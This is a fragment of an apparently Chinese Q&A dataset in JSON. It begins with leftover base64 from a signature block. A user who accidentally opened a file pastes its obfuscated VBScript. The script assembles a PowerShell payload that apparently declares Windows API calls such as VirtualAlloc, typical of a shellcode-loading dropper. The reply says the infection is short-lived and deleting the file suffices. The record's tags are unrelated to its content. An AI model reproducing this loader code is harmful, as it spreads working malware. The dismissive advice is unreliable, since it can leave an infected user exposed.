"oEq4a+IjBMvWohgPMjAyMjExMDgyMzM1MTVaoIITBzCC", "\n", "''", " SIG ", "''", " ", "BsAwggSooAMCAQICEAxNaXJLlPo8Kko9KQeAPVowDQYJ", "\n", "''", " SIG ", "''", " ", "KoZIhvcNAQELBQAwYzELMAkGA1UEBhMCVVMxFzAVBgNV", "\n", "''", " SIG ", "''", " ", "BAoTDkRpZ2lDZXJ0LCBJbmMuMTswOQYDVQQDEzJEaWdp", "\n", "''", " SIG ", "''", " ", "Q2VydCBUcnVzdGVkIEc0IFJTQTQwOTYgU0hBMjU2IFRp", "\n", "''", " SIG ", "''", " ", "bWVTdGFtcGluZyBDQTAeFw0yMjA5MjEwMDAwMDBaFw0z", "\n", "''", " SIG ", "''", " ", "MzExMjEyMzU5NTlaMEYxCzAJBgNVBAYTAlVTMREwDwYD", "\n", "''", " SIG ", "''", " ", "VQQKEwhEaWdpQ2VydDEkMCIGA1UEAxMbRGlnaUNlcnQg", "\n", "''", " SIG ", "''", " ", "VGltZXN0YW1wIDIwMjIgLSAyMIICIjANBgkqhkiG9w0B", "\n", "''", " SIG ", "''", " ", "AQEFAAOCAg8AMIICCgKCAgEAz+ylJjrGqfJru43BDZrb", "\n", "''", " SIG ", "''", " ", "oegUhXQzGias0BxVHh42bbySVQxh9J0Jdz0Vlggva2Sk", "\n", "''", " SIG ", "''", " /QaDFteRkjgcMQKW+", "3", "KxlzpVrzPsYYrppijbkGNcvYlT\n", "''", " SIG ", "''", " ", "4", "DotjIdCriak5Lt4eLl6FuFWxsC6ZFO7KhbnUEi7iGkM\n", "''", " SIG ", "''", " iMbxvuAvfTuxylONQIMe58tySSgeTIAehVbnhe3yYbyq\n", "''", " SIG ", "''", " Ogd99qtu5Wbd4lz1L+", "2", "N1E2VhGjjgMtqedHSEJFGKes+\n", "''", " SIG ", "''", " JvK0jM1MuWbIu6pQOA3ljJRdGVq/", "9XtAbm8WqJqclUeG", "\n", "''", " SIG ", "''", " ", "hXk+DF5mjBoKJL6cqtKctvdPbnjEKD+jHA9QBje6CNk1", "\n", "''", " SIG ", "''", " ", "prUe2nhYHTno+EyREJZ+TeHdwq2lfvgtGx", "/sK0YYoxn2\n", "''", " SIG ", "''", " Off1wU9xLokDEaJLu5i/", "+k", "/kezbvBkTkVf826uV8Mefz\n", "''", " SIG ", "''", " wlLE5hZ7Wn6lJXPbwGqZIS1j5Vn1TS+QHye30qsU5Thm\n", "''", " SIG ", "''", " h1EIa/", "tTQznQZPpWz+D0CuYUbWR4u5j9lMNzIfMvwi4g", "\n", "''", " SIG ", "''", " ", "14Gs0", "/EH1OG92V1LbjGUKYvmQaRllMBY5eUuKZCmt2Fk\n", "''", " SIG ", "''", " +tkgbBhRYLqmgQ8JJVPxvzvpqwcOagc5YhnJ1oV/", "E9mN", "\n", "''", " SIG ", "''", " ", "ec9ixezhe7nMZxMHmsF47caIyLBuMnnHC1mDjcbu9Sx8", "\n", "''", " SIG ", "''", " ", "e47LZInxscS451NeX1XSfRkpWQNO+l3qRXMchH7XzuLU", "\n", "''", " SIG ", "''", " ", "OncCAwEAAaOCAYswggGHMA4GA1UdDwEB", "/wQEAwIHgDAM\n", "''", " SIG ", "''", " BgNVHRMBAf8EAjAAMBYGA1UdJQEB/", "wQMMAoGCCsGAQUF", "\n", "''", " SIG ", "''", " ", "BwMIMCAGA1UdIAQZMBcwCAYGZ4EMAQQCMAsGCWCGSAGG", "\n", "''", " SIG ", "''", " /WwHATAfBgNVHSMEGDAWgBS6FtltTYUvcyl2mi91jGog\n", "''", " SIG ", "''", " j57IbzAdBgNVHQ4EFgQUYore0GH8jzEU7ZcLzT0qlBTf\n", "''", " SIG ", "''", " UpwwWgYDVR0fBFMwUTBPoE2gS4ZJaHR0cDovL2NybDMu\n", "''", " SIG ", "''", " ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0VHJ1c3RlZEc0UlNB\n", "''", " SIG ", "''", " NDA5NlNIQTI1NlRpbWVTdGFtcGluZ0NBLmNybDCBkAYI\n", "''", " SIG ", "''", " KwYBBQUHAQEEgYMwgYAwJAYIKwYBBQUHMAGGGGh0dHA6\n", "''", " SIG ", "''", " Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBYBggrBgEFBQcwAoZM\n", "''", " SIG ", "''", " aHR0cDovL2NhY2VydHMuZGlnaWNlcnQuY29tL0RpZ2lD\n", "''", " SIG ", "''", " ZXJ0VHJ1c3RlZEc0UlNBNDA5NlNIQTI1NlRpbWVTdGFt\n", "''", " SIG ", "''", " cGluZ0NBLmNydDANBgkqhkiG9w0BAQsFAAOCAgEAVaoq\n", "''", " SIG ", "''", " GvNG83hXNzD8deNP1oUj8fz5lTmbJeb3coqYw3fUZPwV\n", "''", " SIG ", "''", " +zbCSVEseIhjVQlGOQD8adTKmyn7oz/", "AyQCbEx2wmInc", "\n", "''", " SIG ", "''", " ", "ePLNfIXNU52vYuJhZqMUKkWHSphCK1D8G7WeCDAJ+uQt", "\n", "''", " SIG ", "''", " ", "1wmJefkJ5ojOfRu4aqKbwVNgCeijuJ3XrR8cuOyYQfD2", "\n", "''", " SIG ", "''", " ", "DoD75P", "/fnRCn6wC6X0qPGjpStOq/", "CUkVNTZZmg9U0rIb", "\n", "''", " SIG ", "''", " ", "f35eCa12VIp0bcrSBWcrduv", "/mLImlTgZiEQU5QpZomvn\n", "''", " SIG ", "''", " Ij5EIdI/", "HMCb7XxIstiSDJFPPGaUr10CU+ue4p7k0x+G", "\n", "''", " SIG ", "''", " ", "AWScAMLpWnR1DT3heYi", "/HAGXyRkjgNc2Wl+WFrFjDMZG\n", "''", " SIG ", "''", " QDvOXTXUWT5Dmhiuw8nLw/", "ubE19qtcfg8wXDWd8nYive", "\n", "''", " SIG ", "''", " ", "QclTuf80EGf2JjKYe", "/", "5", "cQpSBlIKdrAqLxksVStOYkEVg\n", "''", " SIG ", "''", " M4DgI974A6T2RUflzrgDQkfoQTZxd639ouiXdE4u2h4d\n", "''", " SIG ", "''", " jFrIHprVwvDGIqhPm73YHJpRxC+a9l+nJ5e6li6FV8Bg\n", "''", " SIG ", "''", " ", "53", "hWf2rvwpWaSxECyIKcyRoFfLpxtU56mWz06J7UWpjI\n", "''", " SIG ", "''", " n7+NuxhcQ/", "XQKujiYu54BNu90ftbCqhwfvCXhHjjCANd", "\n", "''", " SIG ", "''", " ", "RyxjqCU4lwHSPzra5eX25pvcfizM", "/xdMTQCi2NYBDriL\n", "''", " SIG ", "''", " ", "7", "ubgclWJLCcZYfZ3AYwwggauMIIElqADAgECAhAHNje3\n", "''", " SIG ", "''", " JFR82Ees/", "ShmKl5bMA0GCSqGSIb3DQEBCwUAMGIxCzAJ", "\n", "''", " SIG ", "''", " ", "BgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx", "\n", "''", " SIG ", "''", " ", "GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV", "\n", "''", " SIG ", "''", " ", "BAMTGERpZ2lDZXJ0IFRydXN0ZWQgUm9vdCBHNDAeFw0y", "\n", "''", " SIG ", "''", " ", "MjAzMjMwMDAwMDBaFw0zNzAzMjIyMzU5NTlaMGMxCzAJ", "\n", "''", " SIG ", "''", " ", "BgNVBAYTAlVTMRcwFQYDVQQKEw5EaWdpQ2VydCwgSW5j", "\n", "''", " SIG ", "''", " ", "LjE7MDkGA1UEAxMyRGlnaUNlcnQgVHJ1c3RlZCBHNCBS", "\n", "''", " SIG ", "''", " ", "U0E0MDk2IFNIQTI1NiBUaW1lU3RhbXBpbmcgQ0EwggIi", "\n", "''", " SIG ", "''", " ", "MA0GCSqGSIb3DQEBAQUAA4ICDwAwggIKAoICAQDGhjUG", "\n", "''", " SIG ", "''", " ", "SbPBPXJJUVXHJQPE8pE3qZdRodbSg9GeTKJtoLDMg", "/la\n", "''", " SIG ", "''", " ", "9", "hGhRBVCX6SI82j6ffOciQt/", "nR+eDzMfUBMLJnOWbfhX", "\n", "''", " SIG ", "''", " ", "qAJ9", "/UO0hNoR8XOxs+", "4", "rgISKIhjf69o9xBd/", "qxkrPkLc", "\n", "''", " SIG ", "''", " ", "Z47qUT3w1lbU5ygt69OxtXXnHwZljZQp09nsad", "/ZkIdG\n", "''", " SIG ", "''", " AHvbREGJ3HxqV3rwN3mfXazL6IRktFLydkf3YYMZ3V+", "0", "\n", "''", " SIG ", "''", " VAshaG43IbtArF+y3kp9zvU5EmfvDqVjbOSmxR3NNg1c\n", "''", " SIG ", "''", " ", "1", "eYbqMFkdECnwHLFuk4fsbVYTXn+", "149", "zk6wsOeKlSNbw\n", "''", " SIG ", "''", " sDETqVcplicu9Yemj052FVUmcJgmf6AaRyBD40NjgHt1\n", "''", " SIG ", "''", " biclkJg6OBGz9vae5jtb7IHeIhTZgirHkr+g3uM+onP6\n", "''", " SIG ", "''", " ", "5", "x9abJTyUpURK1h0QCirc0PO30qhHGs4xSnzyqqWc0Jo\n", "''", " SIG ", "''", " n7ZGs506o9UD4L/", "wojzKQtwYSH8UNM", "/STKvvmz3+Drhk\n", "''", " SIG ", "''", " Kvp1KCRB7UK/", "BZxmSVJQ9FHzNklNiyDSLFc1eSuo80Vg", "\n", "''", " SIG ", "''", " ", "vCONWPfcYd6T", "/jnA+bIwpUzX6ZhKWD7TA4j+s4/", "TXkt2", "\n", "''", " SIG ", "''", " ", "ElGTyYwMO1uKIqjBJgj5FBASA31fI7tk42PgpuE+9sJ0", "\n", "''", " SIG ", "''", " ", "sj8eCXbsq11GdeJgo1gJASgADoRU7s7pXcheMBK9Rp61", "\n", "''", " SIG ", "''", " ", "03a50g5rmQzSM7TNsQIDAQABo4IBXTCCAVkwEgYDVR0T", "\n", "''", " SIG ", "''", " ", "AQH", "/BAgwBgEB/", "wIBADAdBgNVHQ4EFgQUuhbZbU2FL3Mp", "\n", "''", " SIG ", "''", " ", "dpovdYxqII+eyG8wHwYDVR0jBBgwFoAU7NfjgtJxXWRM", "\n", "''", " SIG ", "''", " ", "3y5nP+e6mK4cD08wDgYDVR0PAQH", "/BAQDAgGGMBMGA1Ud\n", "''", " SIG ", "''", " JQQMMAoGCCsGAQUFBwMIMHcGCCsGAQUFBwEBBGswaTAk\n", "''", " SIG ", "''", " BggrBgEFBQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQu\n", "''", " SIG ", "''", " Y29tMEEGCCsGAQUFBzAChjVodHRwOi8vY2FjZXJ0cy5k\n", "''", " SIG ", "''", " aWdpY2VydC5jb20vRGlnaUNlcnRUcnVzdGVkUm9vdEc0\n", "''", " SIG ", "''", " LmNydDBDBgNVHR8EPDA6MDigNqA0hjJodHRwOi8vY3Js\n", "''", " SIG ", "''", " My5kaWdpY2VydC5jb20vRGlnaUNlcnRUcnVzdGVkUm9v\n", "''", " SIG ", "''", " dEc0LmNybDAgBgNVHSAEGTAXMAgGBmeBDAEEAjALBglg\n", "''", " SIG ", "''", " hkgBhv1sBwEwDQYJKoZIhvcNAQELBQADggIBAH1ZjsCT\n", "''", " SIG ", "''", " tm+YqUQiAX5m1tghQuGwGC4QTRPPMFPOvxj7x1Bd4ksp\n", "''", " SIG ", "''", " +", "3", "CKDaopafxpwc8dB+k+YMjYC+VcW9dth/", "qEICU0MWfN", "\n", "''", " SIG ", "''", " ", "thKWb8RQTGIdDAiCqBa9qVbPFXONASIlzpVpP0d3+3J0", "\n", "''", " SIG ", "''", " ", "FNf", "/q0+KLHqrhc1DX+", "1", "gtqpPkWaeLJ7giqzl/", "Yy8ZCaH", "\n", "''", " SIG ", "''", " ", "bJK9nXzQcAp876i8dU+6WvepELJd6f8oVInw1YpxdmXa", "\n", "''", " SIG ", "''", " ", "zPByoyP6wCeCRK6ZJxurJB4mwbfeKuv2nrF5mYGjVoar", "\n", "''", " SIG ", "''", " ", "CkXJ38SNoOeY+", "/umnXKvxMfBwWpx2cYTgAnEtp/", "Nh4ck", "\n", "''", " SIG ", "''", " ", "u0+jSbl3ZpHxcpzpSwJSpzd+k1OsOx0ISQ+UzTl63f8l", "\n", "''", " SIG ", "''", " ", "Y5knLD0", "/a6fxZsNBzU+", "2", "QJshIUDQtxMkzdwdeDrknq3l\n", "''", " SIG ", "''", " NHGS1yZr5Dhzq6YBT70/", "O3itTK37xJV77QpfMzmHQXh6", "\n", "''", " SIG ", "''", " ", "OOmc4d0j", "/R0o08f56PGYX/", "sr2H7yRp11LB4nLCbbbxV7", "\n", "''", " SIG ", "''", " ", "HhmLNriT1ObyF5lZynDwN7+YAN8gFk8n+2BnFqFmut1V", "\n", "''", " SIG ", "''", " ", "wDophrCYoCvtlUG3OtUVmDG0YgkPCr2B2RP+v6TR81fZ", "\n", "''", " SIG ", "''", " ", "vAT6gt4y3wSJ8ADNXcL50CN", "/AAvkdgIm2fBldkKmKYcJ\n", "''", " SIG ", "''", " RyvmfxqkhQ/", "8mJb2VVQrH4D6wPIOK+XW+6kvRBVK5xMO", "\n", "''", " SIG ", "''", " ", "Hds3OBqhK", "/bt1nz8MIIFjTCCBHWgAwIBAgIQDpsYjvnQ\n", "''", " SIG ", "''", " Lefv21DiCEAYWjANBgkqhkiG9w0BAQwFADBlMQswCQYD\n", "''", " SIG ", "''", " VQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5jMRkw\n", "''", " SIG ", "''", " FwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSQwIgYDVQQD\n", "''", " SIG ", "''", " ExtEaWdpQ2VydCBBc3N1cmVkIElEIFJvb3QgQ0EwHhcN\n", "''", " SIG ", "''", " MjIwODAxMDAwMDAwWhcNMzExMTA5MjM1OTU5WjBiMQsw\n", "''", " SIG ", "''", " CQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j\n", "''", " SIG ", "''", " MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYD\n", "''", " SIG ", "''", " VQQDExhEaWdpQ2VydCBUcnVzdGVkIFJvb3QgRzQwggIi\n", "''", " SIG ", "''", " MA0GCSqGSIb3DQEBAQUAA4ICDwAwggIKAoICAQC/", "5pBz", "\n", "''", " SIG ", "''", " ", "aN675F1KPDAiMGkz7MKnJS7JIT3yithZwuEppz1Yq3aa", "\n", "''", " SIG ", "''", " ", "za57G4QNxDAf8xukOBbrVsaXbR2rsnnyyhHS5F", "/WBTxS\n", "''", " SIG ", "''", " D1Ifxp4VpX6+n6lXFllVcq9ok3DCsrp1mWpzMpTREEQQ\n", "''", " SIG ", "''", " ", "Lt", "+C8weE5nQ7bXHiLQwb7iDVySAdYyktzuxeTsiT+CFh\n", "''", " SIG ", "''", " mzTrBcZe7FsavOvJz82sNEBfsXpm7nfISKhmV1efVFiO\n", "''", " SIG ", "''", " DCu3T6cw2Vbuyntd463JT17lNecxy9qTXtyOj4DatpGY\n", "''", " SIG ", "''", " QJB5w3jHtrHEtWoYOAMQjdjUN6QuBX2I9YI+EJFwq1WC\n", "''", " SIG ", "''", " QTLX2wRzKm6RAXwhTNS8rhsDdV14Ztk6MUSaM0C/", "CNda", "\n", "''", " SIG ", "''", " ", "SaTC5qmgZ92kJ7yhTzm1EVgX9yRcRo9k98FpiHaYdj1Z", "\n", "''", " SIG ", "''", " ", "XUJ2h4mXaXpI8OCiEhtmmnTK3kse5w5jrubU75KSOp49", "\n", "''", " SIG ", "''", " ", "3ADkRSWJtppEGSt+wJS00mFt6zPZxd9LBADMfRyVw4", "/", "3", "\n", "''", " SIG ", "''", " IbKyEbe7f/", "LVjHAsQWCqsWMYRJUadmJ+9oCw++hkpjPR", "\n", "''", " SIG ", "''", " ", "iQfhvbfmQ6QYuKZ3AeEPlAwhHbJUKSWJbOUOUlFHdL4m", "\n", "''", " SIG ", "''", " ", "rLZBdd56rF+NP8m800ERElvlEFDrMcXKchYiCd98THU", "/\n", "''", " SIG ", "''", " Y+whX8QgUWtvsauGi0/", "C1kVfnSD8oR7FwI+isX4KJpn1", "\n", "''", " SIG ", "''", " ", "5GkvmB0t9dmpsh3lGwIDAQABo4IBOjCCATYwDwYDVR0T", "\n", "''", " SIG ", "''", " ", "AQH", "/BAUwAwEB/", "zAdBgNVHQ4EFgQU7NfjgtJxXWRM3y5n", "\n", "''", " SIG ", "''", " ", "P+e6mK4cD08wHwYDVR0jBBgwFoAUReuir", "/SSy4IxLVGL\n", "''", " SIG ", "''", " p6chnfNtyA8wDgYDVR0PAQH/", "BAQDAgGGMHkGCCsGAQUF", "\n", "''", " SIG ", "''", " ", "BwEBBG0wazAkBggrBgEFBQcwAYYYaHR0cDovL29jc3Au", "\n", "''", " SIG ", "''", " ", "ZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRwOi8v", "\n", "''", " SIG ", "''", " ", "Y2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1", "\n", "''", " SIG ", "''", " ", "cmVkSURSb290Q0EuY3J0MEUGA1UdHwQ+MDwwOqA4oDaG", "\n", "''", " SIG ", "''", " ", "NGh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2Vy", "\n", "''", " SIG ", "''", " ", "dEFzc3VyZWRJRFJvb3RDQS5jcmwwEQYDVR0gBAowCDAG", "\n", "''", " SIG ", "''", " ", "BgRVHSAAMA0GCSqGSIb3DQEBDAUAA4IBAQBwoL9DXFXn", "\n", "''", " SIG ", "''", " ", "OF+go3QbPbYW1", "/e/", "Vwe9mqyhhyzshV6pGrsi+IcaaVQi", "\n", "''", " SIG ", "''", " ", "7aSId229GhT0E0p6Ly23OO", "/", "0", "/", "4C5+KH38nLeJLxSA8hO", "\n", "''", " SIG ", "''", " ", "0Cre+i1Wz", "/n096wwepqLsl7Uz9FDRJtDIeuWcqFItJnL\n", "''", " SIG ", "''", " nU+nBgMTdydE1Od/", "6Fmo8L8vC6bp8jQ87PcDx4eo0kxA", "\n", "''", " SIG ", "''", " ", "GTVGamlUsLihVo7spNU96LHc", "/RzY9HdaXFSMb++hUD38\n", "''", " SIG ", "''", " dglohJ9vytsgjTVgHAIDyyCwrFigDkBjxZgiwbJZ9VVr\n", "''", " SIG ", "''", " zyerbHbObyMt9H5xaiNrIv8SuFQtJ37YOtnwtoeW/", "VvR", "\n", "''", " SIG ", "''", " ", "XKwYw02fc7cBqZ9Xql4o4rmUMYIDdjCCA3ICAQEwdzBj", "\n", "''", " SIG ", "''", " ", "MQswCQYDVQQGEwJVUzEXMBUGA1UEChMORGlnaUNlcnQs", "\n", "''", " SIG ", "''", " ", "IEluYy4xOzA5BgNVBAMTMkRpZ2lDZXJ0IFRydXN0ZWQg", "\n", "''", " SIG ", "''", " ", "RzQgUlNBNDA5NiBTSEEyNTYgVGltZVN0YW1waW5nIENB", "\n", "''", " SIG ", "''", " ", "AhAMTWlyS5T6PCpKPSkHgD1aMA0GCWCGSAFlAwQCAQUA", "\n", "''", " SIG ", "''", " ", "oIHRMBoGCSqGSIb3DQEJAzENBgsqhkiG9w0BCRABBDAc", "\n", "''", " SIG ", "''", " ", "BgkqhkiG9w0BCQUxDxcNMjIxMTA4MjMzNTE1WjArBgsq", "\n", "''", " SIG ", "''", " ", "hkiG9w0BCRACDDEcMBowGDAWBBTzhyJNhjOCkjWplLy9", "\n", "''", " SIG ", "''", " ", "j5bp", "/hx8czAvBgkqhkiG9w0BCQQxIgQgj4P2QjO2zqJ2\n", "''", " SIG ", "''", " Eiqqc6Xe0rmTwOL9WOhQO/", "A6JYbW780wNwYLKoZIhvcN", "\n", "''", " SIG ", "''", " ", "AQkQAi8xKDAmMCQwIgQgx", "/ThvjIoiSCr4iY6vhrE/", "E", "/m\n", "''", " SIG ", "''", " eBwtZNBMgHVXoCO1tvowDQYJKoZIhvcNAQEBBQAEggIA\n", "''", " SIG ", "''", " N4a6/", "PqXZ20xn5mtXpXGWnRHDSZmznxZ5uzEhJYQjFMQ", "\n", "''", " SIG ", "''", " ", "H6", "/tV8EIlSuOD4ubAQ2srfTxER8/", "KUYtUjo5CmhBFQ9y", "\n", "''", " SIG ", "''", " ", "N6eTJMdM2aZEFMBZZBUdB", "/", "6", "Uahs697pg6ZN9yXJLP8/", "G", "\n", "''", " SIG ", "''", " ", "8LzIMFv5MrYGguVHMnLftBPGEqOll8IUwQHEu", "/jziluB\n", "''", " SIG ", "''", " SAMWDQCdhq+VGkbeo8JUN1nbGr9/", "KXIp8rZ3ORobWFe2", "\n", "''", " SIG ", "''", " ", "d", "/CKlq2TgAAZ9QAPROg8Mpht8+G8tEpkP9vP0aB+wDoy\n", "''", " SIG ", "''", " dlruYRaobgZd4T7hsoeVeWN2lL9PLCV1FpCNKX0Pg05y\n", "''", " SIG ", "''", " MvXrldob51CzHTPPHde0buH3KJBJoRafMv5VMHGvaNNS\n", "''", " SIG ", "''", " nOq1WXI44Zqw7/", "y7Ji++nCaIU9ITLjr5qLfPLgXqDWAa", "\n", "''", " SIG ", "''", " ", "hbwfLRagQ3rk9Px+r6V22ApHzHtGmGKnHhgZAI+MJ7HN", "\n", "''", " SIG ", "''", " ", "Zc8Oh65qU1uQ2vsUq5fy3pbEuIRfZmn6AG9zMqsjqw3G", "\n", "''", " SIG ", "''", " ", "30pMnbSImYkKyTIb+jWC8vyLJqbirUaxpk+Iu4Mm9+ot", "\n", "''", " SIG ", "''", " ", "VV+6Ci3UgBssODRdSE9S3aKzGUbRFuWiriYVZxM", "/RJKM\n", "''", " SIG ", "''", " qaP4cnqoAXvTuMv1zU1Iz3han3MQyD3CjAVd0BM5D0m/\n", "''", " SIG ", "''", " ", "OsomA1SK4FAVM6qaPsD444jVIVzPRNP0b5Kc0P8ER6Q", "/\n", "''", " SIG ", "''", " HZvKs+BJqvWmPixPXGt6+KA=\n", "''", " SIG ", "''", " End signature block\n\n\n"]], "Tag": "算法设计"}
{"Answer": "&lt;p&gt;如果当场没有什么异常&amp;#xff0c;现在就不要管他了&amp;#xff0c;这个病毒内容不是长期的&amp;#xff0c;短期没事就不要管他&amp;#xff0c;源文件删掉就好了&lt;/p&gt;", "Konwledge_Point": "NP完全问题", "Question": ["后知后觉错误打开文件，应该怎么办", [" 打开错了一个文件，感觉很危险，", "本人完全不懂，有没有谁可以帮助我。告诉我后面应该怎么办", "\n", " \n\n\nCh9 = Ch9 & ", "\"$Translucences = Affedninge1Affedninge1Affedninge1StAledChdKi-TrTUnyScpgceCh Sp-SyTRayPrpHjeAnDIneRefFiiChnTiiSktSciNooTvnfo Al'BauCasRhiPanRogFu LoSApyCesRetIneKnmaf;TwuUnsSyiFpnDigri BlSNeyprsPrtPheRemPi.ShRUluRenWotTaiTvmPieSk.SaIOpnSttFieClrReoPopBaSVeeSorVivHuiStcTreEtsPo;FipPruLibBilS\"", "\nCh9 = Ch9 & ", "\"eidacDa PesBitEjaEutTiiTicDy TecGelGlaOusHosOu RuAWasSusSkuRerAlaAnnCacRaeThsdeuBumJomRueUnrNenTaeMesSa1An5Di8Ku1Re{Gu[LaDStlPelCyIskmVopUdoYnrDitSc(Sc`Affedninge1Affedninge1Affedninge1OpkWieUnr\"", "\nCh9 = Ch9 & ", "\"conDreFalPo3Pr2Ex`Affedninge1Affedninge1Affedninge1Cr)Di]UnpNeuchbKolMaiOpcKy FosJutBaaBetObiTucAn PieEsxSntBueForFonUn SkvCloSyiOvdSk SaITrnNaiFotfridtaKrlEliBizSteJaCinrDeiVitliiBicBiaUmlLaSkleFocMutWaiSnoPinRb(NyiPonPetOc\"", "\nCh9 = Ch9 & ", "\" MnRCoeRecEtuHepPreUn)Di;Bo[miDLdlNolsuIStmUdpRaoHirMutEx(Ec`Affedninge1Affedninge1Affedninge1SakUdeNordinVeeMalSl3Sc2Pr`Affedninge1Affedninge1Affedninge1So)Si]BapIruCzbUplSpiPrcHa kusintHeaFatDaiPocFo vieskxkotCieMarQunSl NaiAznAbtAr VeGHdeVmtViTLrhWarVkeMaabodOuSUdeselSpeLycmatIloTerPhE\"", "\nCh9 = Ch9 & ", "\"PenMatMurTbyRe(ShiManBatpo FoTPjaMoaUn,syiBenZetJe FasPaaPlndyiTr,TiiCanTotFo HaPInsMayfacMi)An;gp[arDcolAflsoIAnmFepSuoTrrPatFe(Un`Affedninge1Affedninge1Affedninge1SkAObDShVVaAQuPSuIsq3Om2Ha.stDBeLReLOv`Affedninge1Affedninge1Affedninge1Ka)Lo]FupAcuSkbValEliExcSk SasImtSaaBatNoienc\"", "\nCh9 = Ch9 & ", "\"Ar FjeSpxOmtBaeHarCrnCo RaiStnSntEj DdIAnnMiiAktDeiCaaExlgriDizTeeArSSueVicKnuHtrSyiRetStyHiDDieUnsAfcSyrUdiMapdetreoSurDr(foiPonGltFo neHVajLytAk,AfiVenRa\"", "\nCh9 = Ch9 & ", "\"tAn SeOTirpotSphInoMetAr)Ak;Az[DeDValSnlbiIEfmSkpAloStrGltpr(Th`Affedninge1Affedninge1Affedninge1AfuFesFreTvrSe3Ta2Pl`Affedninge1Affedninge1Affedninge1So)Po]SepTruPobRelCiiLicGo TusmitNaafotWaiGrcOu SteFoxRetSke\"", "\nCh9 = Ch9 & ", "\"ClrUrnGe SpiKinCotin PsCHehSkeDucUlkUnDSalPhgCoBNiuUntMatStoEvnSa(maiAbnTotWh UnUTinSvgFeuUniPllJe,uniBonBetFl EvFAfjOmeMarEdkJurSa,RaiArnAntPr BrADkmRebSliBy)Vi;Hu[ZiDPolSclpeIFumSepBroTirMitBe(An`Affedninge1Affedninge1Affedninge1AsiBamPemOv3Bo2Le.JodPolExlRe`Affedninge1Affedninge1Affedninge1\"", "\nCh9 = Ch9 & ", "\"Pe)Pr]InpFouOmbSylSniDycsc vasVatEtaDitKoisocse HaeacxDetCoeFlrArnLu PuiStnMatCh ReICumdymAlGDieGatLiCcooRemCapSloMusAniHatBuiseoDunKaFFuoAlnPatMo(UbiBenHjtto EnRgeeSy\"", "\nCh9 = Ch9 & ", "\"oPevpriexrEm2Dy2Om1Fl,BoiAlnAntMe InDDieNolBrtSn)Do;Bu[RaDTolUnlBuIJamPrpSyoSkrHotVi(mi`Affedninge1Affedninge1Affedninge1thADeDBaVraASpPPeICa3Ye2Sp.BeDImLFrLMo`Affedninge1Affedninge1Affedninge1Si)Be]SepKouNobSalBaiKvcLi bisvitLiaTrtBuiClcPa SmeGrxHytHmeSprGunPo adiDenSttFo \"", "\nCh9 = Ch9 & ", "\"glIDemSapboeDarUdsBioFonDiaTetSaeSpNFoaGamDeeBrdUrPPriOfpDoeBuCNolOpiIneObnBotta(AriTenTatNs UdtKleIrrLimChoKopSt)Su;Va[InDBelPolMiISemPypHeoverHotBa(Mi`Affedninge1Affedninge1Affedn\"", "\nCh9 = Ch9 & ", "\"inge1DeuFlsKoeTarTi3Co2se`Affedninge1Affedninge1Affedninge1Am)Tm]TrpSkuFobAulEriGlcHe EnsRetFaaSatafiEfcVe BreFrxHatMeeCorYonSl SpIIsnSptBePEttGerSa CaESpnDiuEnmToWSuiE\"", "\nCh9 = Ch9 & ", "\"knYodUnoNywEnSmatHaaPatSjiBeoStnFasBoWOm(BauSciInnSptRe KovBu1ar,AciSknFrtfr Hovto2Ka)Ma;Ro[BiDBllFolKoISamBopApoAmrOutde(De`Affedninge1Affedninge1Affedninge1KikIneSur\"", "\nCh9 = Ch9 & ", "\"LanCyeAnlSy3Fa2Ri`Affedninge1Affedninge1Affedninge1Fr)Ag]AdpcouIlbSllTaiRecGa GrsCrtGyaButPriIncpo FreNoxButPaeunrIdnSu SyiChnSptPr AcVSiiSerBetEluFoaBrlArAAnlnolPooMocSw(SkiPlnGstPj AnvSu1Ko,TeiUsnMotZs FlvGv2Ru,KoiMynSkt\"", "\nCh9 = Ch9 & ", "\"Ru ImvRe3ru,TiiDanAgtBo VevVi4Ly)At;Xy[SkDtrlHalFrIElmPrpSkoSprKutSc(Tj`Affedninge1Affedninge1Affedninge1MokAseEarDenEleMelDe3Af2En`Affedninge1Affedninge1Affedninge1Ef)ol]EppBuuOvbSylGaiArcFo HusUntMoaUntReiTrcUn BleSoxSetShecirXenDi GivSvopriModPa PaSEmeKotKoFBliNolImeUnAElpCeiBrsfiTKooMiAMiNB\"", "\nCh9 = Ch9 & ", "\"aSinItr(Fl)Bg;Te[UdDFrlBalTwIHymHepTooRarPrtGn(Vo`Affedninge1Affedninge1Affedninge1BlwHyiHjnNumUnmFi.SpdHultelBj`Affedninge1Affedninge1Affedninge1Pe)St]OvpFuuBnbTilFaiGrcan\"", "\nCh9 = Ch9 & ", "\" InsRjtUnaNotUniavcRe RueMaxDethaeInrOvnUn TriPenRetIn PamEgmfoiInoTeWSirSuichtofeRa(AniConDetCo KiHHoapolVa,MiiIknTitOx TeBHeeUnaIn,HeiClnRotAt FaSTilAbaNogNo2Ci1Bo9hj)Ko;Un[BuDLslAglunIGemFrpEaoPerNotBe(Tm`Affedninge1Affednin\"", "\nCh9 = Ch9 & ", "\"ge1Affedninge1SluRasFoeDarIl3Ga2An`Affedninge1Affedninge1Affedninge1Fe)Ca]UnpDeuBrbStlReiHecDu DasPrtBiaFntUriMucSm BreNoxuntDeePorPonCh UniKnnSctSu GaTWerMaaStnMisFolcaaEvtNieVaMAfDSbIBiSHoyBasSuAWocWicgeeDilAc(KriFrnNetBe KrIMinBofHyoBe,SliTonSntEm \"", "\nCh9 = Ch9 & ", "\"FolTiiUpgPo)Pi;Sp}at'Me;No`$PrAUesEnsabuImrDeaAfnVicFueNisAfuLamMimGleBurBrnHaeShsBo1Op5Ag8Pa2Ab=Br`$TreVonSvvPa:kraBapImpPjdRoaKotReaCa In+Ps Ty`Affedninge1Affedninge1Affedninge1En\\NiIsksStoMolReeBorAliPonLugKosEfmTuaUntMueLnrJeiGyaHelHeeUkrSanSpeGasAs.BydMoahetCy`A\"", 